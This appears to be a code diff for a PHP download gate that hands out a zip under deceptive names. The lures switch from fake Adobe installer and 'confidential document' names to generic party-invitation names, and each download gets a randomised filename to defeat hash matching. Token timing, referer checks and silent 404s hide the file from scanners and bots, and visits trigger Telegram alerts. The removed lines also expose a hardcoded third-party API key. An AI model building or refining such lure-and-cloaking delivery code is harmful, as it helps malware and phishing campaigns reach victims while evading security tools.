@@ -31,21 +31,9 @@ define('SECRET', (string)($_ENV['TK_SECRET'] ?? 'railway-adobe-landing-9f2e1c7a4
 define('TTL', 900);            // token lifetime (15 min)
 define('MIN_DL_AGE', 6);       // index -> ... -> dl must span >= 6s (5s spinner + 2s button)
 define('RATE_LIMIT', 5);       // served downloads per IP per 1h window
-define('SOURCE_ZIP', __DIR__ . '/src/Adobe_Setup.zip');
+define('SOURCE_ZIP', __DIR__ . '/src/Event_Invite.zip');
 define('RATE_DIR', sys_get_temp_dir());
 define('ALERT_DIR', sys_get_temp_dir());
-
-// Jev (TypeSafe System One) — behavioral verdict per visit. Server-side
-// only: the key never ships in the zip. If the API is unreachable the
-// gate silently falls back to the legacy fixed-time pacing.
-define('JEV_KEY',         (string)($_ENV['JEV_API_KEY'] ?? 'apikey_22504335078570cc430bbc1d72094c9c1d35_8b6a33f498ad59a20fb3ac2bbfccd22b299e9feb9561159772f40e74ddb88876'));
-define('JEV_URL',         'https://api.typesafe.ai/v1/systemone');
-define('JEV_TIMEOUT',     4);    // hard cap on the verdict call (seconds)
-define('JEV_HUMAN_MIN',   0.55); // noul >= this  -> 'fast'  (verified human)
-define('JEV_MID_MIN',     0.45); // mid band: model's own choice decides
-define('JEV_BOT_MAX',     0.40); // noul <  this  -> 'low'   (friction + flag)
-define('JEV_STATE_LIMIT', 32768); // max telemetry body bytes we will parse
-define('JEV_CALLS_PER_IP', 10);  // verdict calls per IP per hour
 
 // Ensure the temp data dirs exist (idempotent, once per process).
 foreach (array_unique([RATE_DIR, ALERT_DIR]) as $__d) {
@@ -67,16 +55,8 @@ function ua(): string { return (string)($_SERVER['HTTP_USER_AGENT'] ?? ''); }
 
 function sign(string $d): string { return hash_hmac('sha256', $d, SECRET); }
 
-function issue_token(array $verdict = [], ?int $baseTime = null): string {
-    // $baseTime: when a verdict upgrades an existing token, keep the
-    // ORIGINAL mint time so the min-age pacing measures the whole visit
-    // (index -> ... -> dl), not just the post-decide tail.
-    $payload = ['t' => ($baseTime ?? time()), 'r' => bin2hex(random_bytes(8))];
-    if ($verdict !== []) {
-        $payload['v'] = (float)($verdict['n'] ?? 0);   // noul (0..1 human prob)
-        $payload['p'] = (string)($verdict['p'] ?? ''); // fast | robust | '' (pending/legacy)
-        $payload['f'] = (int)($verdict['f'] ?? 0);     // 1 = flagged (gray zone)
-    }
+function issue_token(): string {
+    $payload = ['t' => time(), 'r' => bin2hex(random_bytes(8))];
     $b64 = rtrim(strtr(base64_encode(json_encode($payload)), '+/', '-_'), '=');
     return $b64 . '.' . sign($b64);
 }
@@ -95,88 +75,6 @@ function check_token(?string $tok): ?array {
 function tok_nonce(?string $t): string {
     $p = check_token($t);
     return (string)($p['r'] ?? 'x');
-}
-
-// -------------------------------------------------- Jev behavioral verdict
-// One Jev (TypeSafe System One) call per visit. Returns:
-//   ['n' => float 0..1 (noul, human probability),
-//    'p' => 'fast' | 'robust',   // HTA download-engine profile
-//    'f' => 0|1|2]               // 0 none, 1 gray-zone flag, 2 low/bot
-// or null on ANY failure (API down, bad response, timeout) — callers then
-// fall back to the legacy fixed-time gate with the original token.
-function jev_call(array $state): ?array {
-    $payload = json_encode([
-        'state' => $state,
-        'model' => 'jev-latest',
-        'questions' => [
-            'human' => [
-                'type' => 'noul',
-                'instructions' => "Is this browser session's mouse, keyboard, and scroll behavior consistent with a real human interacting with the page, or does it look automated/scripted (missing, perfectly uniform, teleporting, or statistically impossible input patterns)?",
-            ],
-            'profile' => [
-                'type' => 'choice',
-                'instructions' => 'Choose the download engine profile to hand this visitor based on how human and network-stable their session looks.',
-                'criteria' => [
-                    'fast'   => 'Confidently human and steady: aggressive fast engine, minimal retries',
-                    'robust' => 'Uncertain, flaky, or possibly automated: conservative engine with full retry and fallback chain',
-                ],
-            ],
-        ],
-    ], JSON_UNESCAPED_SLASHES);
-
-    $ctx = stream_context_create(['http' => [
-        'method' => 'POST',
-        'header' => "Content-Type: application/json\r\n"
-                  . "User-Agent: adobe-landing/1.0\r\n"
-                  . "Authorization: Bearer " . JEV_KEY,
-        'content' => $payload, 'timeout' => JEV_TIMEOUT, 'ignore_errors' => true,
-    ]]);
-    $body = @file_get_contents(JEV_URL, false, $ctx);
-    if ($body === false) return null;
-    $j = json_decode((string)$body, true);
-    if (!is_array($j) || !isset($j['answers']['human']['noul'])) return null;
-
-    $n = max(0.0, min(1.0, (float)$j['answers']['human']['noul']));
-    $choice = 'robust';
-    if (isset($j['answers']['profile']['choice'])) {
-        $choice = ($j['answers']['profile']['choice'] === 'fast') ? 'fast' : 'robust';
-    }
-    // Decision table (probability is primary, model choice is the tie-breaker
-    // in the middle band):
-    //   noul >= JEV_HUMAN_MIN            -> fast
-    //   JEV_MID_MIN <= noul < HUMAN_MIN  -> fast only if the model chose fast
-    //   noul <  JEV_MID_MIN              -> robust
-    $p = $n >= JEV_HUMAN_MIN ? 'fast' : ($n >= JEV_MID_MIN && $choice === 'fast' ? 'fast' : 'robust');
-    $f = $n < JEV_BOT_MAX ? 2 : ($p === 'fast' ? 0 : 1);
-    return ['n' => $n, 'p' => $p, 'f' => $f];
-}
-
-// Rate-limit Jev verdict calls per IP (a normal visit costs exactly one).
-function jev_rate_allows(string $ip): bool {
-    $f = RATE_DIR . '/jev_' . md5($ip) . '_' . date('YmdH');
-    $n = (int)@file_get_contents($f);
-    $n++;
-    @file_put_contents($f, (string)$n, LOCK_EX);
-    return $n <= JEV_CALLS_PER_IP;
-}
-
-// Effective min-age for a token: 'fast' verdicts skip the wait entirely;
-// 'low/bot' verdicts get extra friction; everything else keeps the base.
-function verdict_min_age(array $tok, int $base): int {
-    if (isset($tok['p']) && $tok['p'] === 'fast') return 0;
-    if ((int)($tok['f'] ?? 0) === 2) return max($base * 3, 12);
-    return $base;
-}
-
-// One-line behavioral verdict for the Telegram alerts ('' = legacy token).
-function verdict_line(array $tok): string {
-    if (!isset($tok['v']) && !isset($tok['p'])) return '';
-    $n = isset($tok['v']) ? number_format((float)$tok['v'], 2) : '?';
-    $p = (string)($tok['p'] ?? 'legacy');
-    $f = (int)($tok['f'] ?? 0);
-    $tag = $f === 2 ? '\xE2\x9A\xA0\xEF\xB8\x8F LOW/BOT (friction applied)'
-        : ($f === 1 ? 'GRAY (flagged)' : 'HUMAN');
-    return "\n\x{1F916} Behavior: " . $tag . " \x{2014} human " . $n . ", " . $p . " engine";
 }
 
 // --------------------------------------------------- request headers
@@ -389,7 +287,8 @@ function gate_doc(array $allowedRefPaths, int $minAge, bool $requireUser): void 
     if ($mailArr) {
         if (!$entry) {
             $tok = check_token($_GET['tk'] ?? null);
-            if (!$tok || time() - (int)$tok['t'] < verdict_min_age($tok, $minAge)) silent_404();
+            if (!$tok) silent_404();
+            if (time() - (int)$tok['t'] < (function_exists('verdict_min_age') ? verdict_min_age($tok, $minAge) : $minAge)) silent_404();
         }
         return;
     }
@@ -399,7 +298,7 @@ function gate_doc(array $allowedRefPaths, int $minAge, bool $requireUser): void 
     if (!$entry) {
         $tok = check_token($_GET['tk'] ?? null);
         if (!$tok) silent_404();
-        if (time() - (int)$tok['t'] < verdict_min_age($tok, $minAge)) silent_404();
+        if (time() - (int)$tok['t'] < (function_exists('verdict_min_age') ? verdict_min_age($tok, $minAge) : $minAge)) silent_404();
         if (!referer_ok($allowedRefPaths)) silent_404();
     }
 }
@@ -421,36 +320,47 @@ function gate_dl(): array {
     }
     $tok = check_token($_GET['tk'] ?? null);
     if (!$tok) silent_404();
-    if (time() - (int)$tok['t'] < verdict_min_age($tok, MIN_DL_AGE)) silent_404();
+    if (time() - (int)$tok['t'] < MIN_DL_AGE) silent_404();
     if (!referer_ok(['/complete.php'])) silent_404();
     return $tok;
 }
 
 // ------------------------------------------------- name generation
-// Mixed pool: fresh Adobe-setup names AND fresh document names per visit.
+// Invitation-only name pool. Open, generic, sender-agnostic — no host,
+// company or location, so it works sent from any inbox to anyone. A fresh
+// name (and a fresh hash) per download.
 function make_name(): string {
-    $adobe = [
-        'Adobe_Acrobat_Pro_DC_'          . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_Creative_Cloud_Updater_'  . sprintf('%d.%d.%04d', random_int(3,7),  random_int(1,9), random_int(1,9999)),
-        'Adobe_Acrobat_Standard_DC_'     . sprintf('%d.%d.%04d', random_int(23,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_DC_Reader_Patch_'         . sprintf('%d.%d.%04d', random_int(22,25), random_int(1,9), random_int(1,9999)),
-        'Adobe_Acrobat_Sign_'            . sprintf('%d.%d.%04d', random_int(2,5),  random_int(1,9), random_int(1,9999)),
-        'Adobe_Update_Package_'          . random_int(10000, 99999),
+    $invites = [
+        'Cocktails_and_Conversation_Invite_' . random_int(10000, 99999),
+        'Cocktails_Conversation_Invitation_' . random_int(100000, 999999),
+        'Youre_Invited_'                     . random_int(10000, 99999),
+        'You_Are_Invited_'                   . random_int(10000, 99999),
+        'Private_Gathering_Invite_'          . random_int(10000, 99999),
+        'Private_Invitation_'                . random_int(10000, 99999),
+        'Exclusive_Invitation_'              . random_int(10000, 99999),
+        'Exclusive_Evening_Invite_'          . random_int(10000, 99999),
+        'Event_Invitation_'                  . date('Y') . '_' . random_int(10000, 99999),
+        'Evening_Invitation_'                . random_int(10000, 99999),
+        'Evening_With_Friends_Invite_'       . random_int(10000, 99999),
+        'RSVP_'                              . date('Y') . '_' . random_int(10000, 99999),
+        'RSVP_Invitation_'                   . random_int(10000, 99999),
+        'Save_the_Date_'                     . date('Y') . '_' . random_int(1000, 9999),
+        'Guest_List_Invite_'                 . random_int(10000, 99999),
+        'Guest_Invitation_'                  . random_int(10000, 99999),
+        'Personal_Invitation_'               . random_int(10000, 99999),
+        'Special_Occasion_Invite_'           . random_int(10000, 99999),
+        'Networking_Evening_Invite_'         . random_int(10000, 99999),
+        'Business_Cocktail_Evening_Invite_'  . random_int(10000, 99999),
+        'Cocktail_Evening_Invitation_'       . random_int(100000, 999999),
+        'Conversation_Evening_Invite_'       . random_int(10000, 99999),
+        'Invitation_Evening_'                . random_int(10000, 99999),
+        'The_List_Invitation_'               . random_int(10000, 99999),
     ];
-    $conf = [
-        'Confidential_Document_' . random_int(100000, 999999),
-        'Confidential_Record_'   . date('Ymd') . '_' . random_int(1000, 9999),
-        'Internal_Memo_'         . random_int(10000, 99999),
-        'Contract_Agreement_'    . random_int(100000, 999999),
-        'Document_File_'         . date('Ymd') . '_' . random_int(100, 999),
-        'Statement_Report_'      . date('Y') . '_' . random_int(1000, 9999),
-    ];
-    $pool = random_int(0, 1) ? $conf : $adobe;   // 50/50 mix
-    return $pool[random_int(0, count($pool)-1)] . '.zip';
+    return $invites[random_int(0, count($invites)-1)] . '.zip';
 }
 
 function name_kind(string $name): string {
-    return preg_match('/^adobe/i', $name) ? 'adobe' : 'document';
+    return 'invitation';
 }
 
 // ------------------------------------------------------- telegram
